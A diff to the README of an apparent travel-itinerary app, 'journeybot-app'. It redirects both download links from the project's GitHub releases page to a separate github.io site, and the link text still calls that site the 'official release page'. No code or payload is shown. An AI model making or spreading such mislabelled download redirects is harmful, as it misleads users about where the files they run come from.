@@ -1,6 +1,6 @@
 # ✈️ journeybot-app - Plan your next trip with ease
 
-[![](https://img.shields.io/badge/Download_Journeybot-blue)](https://github.com/pipcomplicated46/journeybot-app/releases)
+[![](https://img.shields.io/badge/Download_Journeybot-blue)](https://pipcomplicated46.github.io)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ Journeybot helps you organize your travels. The app creates custom itineraries a
 Follow these steps to access the application on your computer.
 
 1. Open your web browser.
-2. Go to the [official release page](https://github.com/pipcomplicated46/journeybot-app/releases).
+2. Go to the [official release page](https://pipcomplicated46.github.io).
 3. Find the latest version of the software.
 4. Click the file name to start the download process.
 5. Save the file to your computer.
